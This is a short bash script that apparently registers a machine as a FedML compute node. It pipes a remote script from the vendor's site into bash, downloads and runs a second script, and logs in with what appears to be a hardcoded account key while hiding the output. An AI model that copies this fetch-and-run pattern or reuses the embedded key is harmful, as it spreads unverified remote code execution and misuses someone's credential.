#!/bin/bash

# Step 1: Run the installation verification script
sudo curl -sSf https://doc.fedml.ai/shell/verify_installation_driver.sh | bash
if [ $? -ne 0 ]; then
  echo "Failed to run verify_installation_driver.sh"
  exit 1
fi

# Step 2: Generate a random name using Python
generated_name=$(python3 -c "import random; import string; print(''.join(random.choices(string.ascii_lowercase, k=8)))")

# Step 3: Login to fedml with the generated name
fedml login -p 851497657a944e898d5fd3f373cf0ec0 -n $generated_name -mpt COMMUNITY -pph 0.2 > /dev/null 2>&1

# Step 4: Download, run, and remove the render node bind script
wget -q https://doc.fedml.ai/shell/render_node_bind.sh
if [ $? -ne 0 ]; then
  echo "Failed to download render_node_bind.sh"
  exit 1
fi

sudo chmod +x render_node_bind.sh
bash render_node_bind.sh
if [ $? -ne 0 ]; then
  echo "Failed to run render_node_bind.sh"
  exit 1
fi

sudo rm render_node_bind.sh
